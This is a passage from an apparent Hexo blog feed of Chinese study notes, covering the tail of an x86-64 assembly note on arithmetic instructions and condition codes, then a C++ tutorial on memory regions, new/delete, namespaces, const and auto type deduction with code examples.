<h5 id="2-一元操作和二元操作"><a href="#2-一元操作和二元操作" class="headerlink" title="2.一元操作和二元操作"></a>2.一元操作和二元操作</h5><p> 只有一个操作数的是一元操作，既是源操作数也是目的操作数<br>地址          值              寄存器       值<br>0x100      0xFF             rax        0x100<br>0x108      0xAB             rcx        0x1<br> 0x118  0x11           rdx        0x3<br><strong>subq</strong> %rax,%rdx rdx &#x3D; rdx -rax<br><strong>addq</strong> %rcx , (%rax)   ;更新的其实是一个内存位置 位置为0x100<br><strong>imulq</strong> $16,(%rax,%rdx,8) ;更新的内存位置是0x118，值对应的是0x11*16&#x3D;0x110<br>他们的目的和最终值写出来<br>imulq 有符号乘法 一个操作数 这个指令要求就是必须两个数都在寄存器rax中 把高64位存放在rdx，低64位存放在rax里面<br><strong>salq</strong> $4,%rax(左移4位，扩大了2的4次方倍)</p>
<h5 id="控制操作"><a href="#控制操作" class="headerlink" title="控制操作"></a>控制操作</h5><p>t  &#x3D; a + b<br>无符号溢出 <strong>CF</strong> （条件码）<br>  t&#x3D;&#x3D;0 <strong>ZF</strong><br> t &lt; 0  <strong>SF</strong><br> (a&lt;0&amp;&amp;b&lt;0) &amp;&amp; (t&lt;0 !&#x3D; a &lt;0) 有符号溢出 <strong>OF</strong><br><strong>leaq</strong> 不会改变任何条件码 xor 会将进位标志和溢出位标志设置成0<br><strong>cmpb</strong> 比较字节 <strong>cmpw</strong> 比较字  <strong>test</strong> 测试<br><strong>cmp</strong> rsi,rdi<br>cmp根据两个比较数的差来设置条件码 （除了不更新寄存器以外，和sub操作是一样的 test也是除了不更新寄存器以外，和 and 操作是一样的）<br><strong>testq</strong> %rax,%rax 检查rax是负数还是正数还是0<br> set指令设置条件码</p>
]]></content>
      <categories>
        <category>pwn基础</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>现代C++学习笔记</title>
    <url>/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="C-的基本特性"><a href="#C-的基本特性" class="headerlink" title="C++的基本特性"></a>C++的基本特性</h1><h2 id="程序的执行过程"><a href="#程序的执行过程" class="headerlink" title="程序的执行过程"></a>程序的执行过程</h2><p>程序被执行后就被称为一个进程，一个进程可以被划分为很多区域。</p>
<p>其中比较重要的是以下四个区域。</p>
<p><strong>1代码区与常量区：</strong>进程按照代码区的代码执行，真正的常量也存储在这里，比如“abc”字符串，“1”，“88”等数字。这些是真正的常量。再看一下const关键字。const只不过是让编译器将变量视为常量罢了，和真正的常量有本质上的区别</p>
<p><strong>2栈区：</strong>函数的执行所需的空间，注意，当函数执行完毕，函数对应的栈内存全部销毁。</p>
<p><strong>3堆区：</strong>进程用来分配内存的地方，只有手动释放才能销毁内存。</p>
<p><strong>4静态变量区：</strong></p>
<p>(1)静态变量：常常遇到的一些局部作用范围，生命周期却很长的变量。</p>
<p>(2)全局变量：在c++中不建议使用，会破坏封装性。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/image-20230306163148843-1678164508218-1.png"></p>
<hr>
<p><strong>堆和栈的关系</strong></p>
<p>堆区有灵活的生命周期。如果需要创建的对象有几十M，每次调用函数都需要创建一个这么大的对象，再复制到对应的容器中，那就太过耗费内存了。而且栈内存非常的小，通常不超过8M。而使用堆内存，每调用一次函数就可以在堆内存中创建一个对象，容器中只要存储指针就可以了，极大的提高了程序效率。栈区是函数执行的区域，堆区是函数内灵活分配内存的地方，二者缺一不可。堆的唯一寻址方式就是指针，如果没有栈，根本无法使用堆。</p>
<h2 id="new-关键字及内存泄漏"><a href="#new-关键字及内存泄漏" class="headerlink" title="(*) new 关键字及内存泄漏"></a>(*) new 关键字及内存泄漏</h2><p><strong>1.new关键字是c++用来动态分配内存的主要方式</strong>.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">100</span>);</span><br><span class="line">	std::cout &lt;&lt; *pi &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">delete</span> pi;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>new可以直接分配单个变量的内存，也可以分配数组。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">100</span>]();<span class="comment">//小括号初始化为零，没有小括号分配未定义的内存，而且不可以赋初值</span></span><br><span class="line">	std::cout &lt;&lt; pi[<span class="number">20</span>] &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">delete</span>[] pi;<span class="comment">//不加中括号会导致动态内存泄露</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>在分配单个对象的内存时，</strong></p>
<p>当对象是普通变量时，可以分配对应的内存</p>
<p>当对象是类对象时，会调用构造函数，如果没有对应的构造函数，就会报错。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::string* pString = <span class="keyword">new</span> std::<span class="built_in">string</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//如果是字符串数组的话不能赋初值</span></span><br><span class="line">	std::cout &lt;&lt; *pString &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">delete</span> pString;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在分配数组对象内存时：</p>
<p>对于普通变量：可以使用“（）”将所有对象全部初始化为0。</p>
<p>对于类对象，有没有“（）”都一样，均使用默认构造函数，如果没有默认构造函数就会报错。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">int</span> i_) :<span class="built_in">i</span>(i_)&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	Test* pTest = <span class="keyword">new</span> Test[<span class="number">100</span>];<span class="comment">//这是错误的,类Test不存在默认构造函数</span></span><br><span class="line">	<span class="keyword">delete</span>[] pTest;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2内存泄漏</strong></p>
<p>​	内存泄露会导致堆内存的逐渐被占用，最终内存用完程序崩溃。常见的情况就是项目测试没问题，上线几天就炸了。然后就会非常麻烦，排查困难，损失很大。</p>
<p><strong>内存泄露是最严重的错误之一，程序不怕报错，就怕一开始运行的好好的，突然就出现了莫名其妙的错误。</strong></p>
<p>这句话也引出了后面的两个部分。（期待学习hhh）</p>
<p><strong>Part4的智能指针</strong>可以非常好的避免内存泄露的问题。</p>
<p><strong>Part9的异常处理</strong>部分可以恰当的处理程序出现的异常，让程序有错误就立马处理，或直接终止进程，或忽略，不要让异常莫名其妙。这是程序设计的重要理念。</p>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>C++经常需要多个团队合作来完成大型项目。多个团队就常常出现起名重复的问题，C++就提供了命名空间来解决这个问题。</p>
<p><strong>例子</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">BTest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">BTest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;B::()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">ATest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;A::()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();<span class="comment">//报错，不知道调用哪个test函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解决(使用命名空间)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BTest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> B</span><br><span class="line">&#123;   </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BTest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">namespace</span> B</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;B::test()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ATest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;A::test()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	B::<span class="built_in">test</span>();</span><br><span class="line">    A::<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>顺便提两点</strong></p>
<p>命名空间的实现原理，C++最后都要转化为C来执行程序。在namespace A中定义的Test类，其实全名是A::Test。C++所有特有的库（指c没有的库）,都使用了std的命名空间。比如最常用的iostream。</p>
<p><strong>using关键字设计的目的之一就是为了简化命名空间的。using关键字在命名空间方面主要有两种用法。</strong></p>
<ol>
<li><p><strong>using 命名空间::变量名</strong>。这样以后使用此变量时只要使用变量名就可以了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> A::test;</span><br><span class="line"><span class="keyword">using</span> B::test;<span class="comment">//同时使用会报错</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>using namspce 命名空间</strong>。这样，每一个变量都会在该命名空间中寻找。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> A;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> B;<span class="comment">//同时使用会报错</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>所以，头文件中一定不能使用using关键字。会导致命名空间的污染</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">错误代码</span><br><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> A;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="C-的标准输入输出简介"><a href="#C-的标准输入输出简介" class="headerlink" title="(*)C++的标准输入输出简介"></a>(*)C++的标准输入输出简介</h2><p>输入输出简单来说就是数据在输入设备，内存，硬盘，输出设备之间移动的过程。</p>
<p>c语言设定了很多不相关的函数还实现这些过程。</p>
<p>比如printf就是让数据从内存到显示屏（显示屏就是输出设备）。scanf就是让数据从键盘（键盘是输入设备）到内存。此外还有从内存到磁盘的文件操作函数。</p>
<p> c语言的函数虽然简单方便，但彼此之间没有关联。C++有了继承功能，可以让子类与父类之间有关联性，极大的提高各种输入输出功能之间的耦合性。</p>
<p>于是C++用继承功能重写了输入输出功能，这就是io库，io库引入了“流”的概念，数据从一个地方到另一个地方，原本地方的数据就没了，叫做流很贴切。</p>
<p> io库是一个很大的部分，但现阶段我们只要会使用输入输出流，cout和cin就可以了。</p>
<p>cout可以让数据从内存流到输出设备，cin可以让数据从输入设备流到内存。</p>
<h2 id="const关键字的介绍"><a href="#const关键字的介绍" class="headerlink" title="const关键字的介绍"></a>const关键字的介绍</h2><p>const是让编译器将变量视为常量，用const修饰的变量和真正的常量有本质的区别。</p>
<ol>
<li><p>真正的常量存储在<strong>常量区</strong>或<strong>代码区</strong>，比如“abcdefg”这个字符串就存储在常量区，而“3”，“100”这些数字就存储在代码区中，这些都是真正的常量，<strong>无法用任何方式修改。</strong></p>
</li>
<li><p>const修饰的变量仍然存储在<strong>堆区</strong>或<strong>栈区</strong>中，<strong>从内存分布的角度讲，和普通变量没有区别。</strong>const修饰的变量并非不可更改的，C++本身就提供了mutable关键字（这个关键字在Part3就会讲的）用来修改const修饰的变量，从汇编的角度讲，const修饰的变量也是可以修改的。</p>
</li>
</ol>
<h2 id="auto关键词的使用"><a href="#auto关键词的使用" class="headerlink" title="(**)auto关键词的使用"></a>(**)auto关键词的使用</h2><p>auto是C++11新加入的关键字，就是为了简化一些写法。</p>
<p>为了学习auto的类型推断，我使用一个boost库来确定变量的具体类型。boost库很大，可以选择编译自己想要的模块，我就直接全部编译了。boost是很复杂的，不是几句话能说清楚，要深入理解可以去官网学习。</p>
<p>演示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">auto</span> i = <span class="number">100</span>;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>来说一下auto，有好几个点需要注意：</strong></p>
<p>**1.**auto只能推断出类型，引用不是类型，所以auto无法推断出引用，要使用引用只能自己加引用符号。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//输出类型int &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**2.**auto关键字在推断引用的类型时：会直接将引用替换为引用指向的对象。其实引用一直是这样的，引用不是对象，任何使用引用的地方都可以直接替换成引用指向的对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>&amp; refi = i;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.<strong>auto关键字在推断类型时，如果没有引用符号，会忽略值类型的const修饰，而保留修饰指向对象的const，典型的就是指针。</strong>可能有些不好理解，看看代码就好说了。3和4的主要作用对象就是指针.</strong></p>
<p>例子1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> pi = &amp;i;<span class="comment">//前者const修饰的是指针pi修饰的值，后者const修饰的是pi，后者const会被忽略</span></span><br><span class="line">	<span class="keyword">auto</span> pi2 = pi;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(pi2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const *=const int *</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span> i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>**4.**auto关键字在推断类型时，如果有了引用符号，那么值类型的const和修饰指向对象的const都会保留。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> pi = &amp;i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">auto</span>&amp; pi2 = pi;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(pi2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const * const &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>其实3，4为什么会出现这种情况，因为在传递值时，修改这个值并不会对原有的值造成影响。而传递引用时，修改这个值会直接对原有的值造成影响。</strong></p>
<p>**5.**当然，我们可以在前面加上const，这样永远都有const的含义。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>auto不会影响编译速度，甚至会加快编译速度。因为编译器在处理XX a &#x3D; b时，当XX是传统类型时，编译期需要检查b的类型是否可以转化为XX。当XX为auto时，编译期可以按照b的类型直接给定变量a的类型，所以效率相差不大，甚至反而还有提升。</li>
<li>（*）最重要的一点，就是auto不要滥用，对于一些自己不明确的地方不要乱用auto，否则很可能出现事与愿违的结果，使用类型应该安全为先。</li>
<li>（*）auto主要用在与模板相关的代码中，一些简单的变量使用模板常常导致可读性下降，经验不足还会导致安全性问题。</li>
</ol>
<h2 id="静态变量，指针和引用"><a href="#静态变量，指针和引用" class="headerlink" title="(*)静态变量，指针和引用"></a>(*)静态变量，指针和引用</h2><p>变量的存储位置有三种，分别是静态变量区，栈区，堆区。</p>
<p>**1.**静态变量区在编译时就已经确定地址，存储全局变量与静态变量。</p>
<p>演示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> g_i = <span class="number">0</span>;<span class="comment">//全局变量，在程序编译时已经初始化</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">unsigned</span> callCount = <span class="number">0</span>;<span class="comment">//这行代码在编译时已经初始化，直接执行下一行</span></span><br><span class="line">	<span class="keyword">return</span> ++callCount;<span class="comment">//统计函数调用次数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="type">unsigned</span> testFuncCallCount = <span class="built_in">test</span>();</span><br><span 